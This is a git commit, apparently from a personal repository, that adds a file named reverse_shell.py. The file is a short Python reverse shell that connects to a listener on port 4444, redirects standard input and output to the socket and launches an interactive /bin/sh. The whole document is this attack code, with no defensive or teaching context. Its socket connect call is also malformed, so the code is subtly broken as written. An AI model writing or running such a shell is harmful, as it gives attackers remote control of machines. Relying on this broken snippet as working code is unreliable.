b661996357ac1b525e38d4a7270f73fb0dcf1ce8
Nashia Holloway <nashiaholloway@protonmail.com>
2020-02-25 20:25:15 -0500

    reverse py

---
+++ reverse_shell.py
@@ -0,0 +1,16 @@
+import socket
+import subprocess
+import os
+
+# create socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# connect to listening server
+s.connect("127.0.0.1", 4444)
+
+# invoke reverse shell
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+
+proc = subprocess.call(["/bin/sh", "-i"])
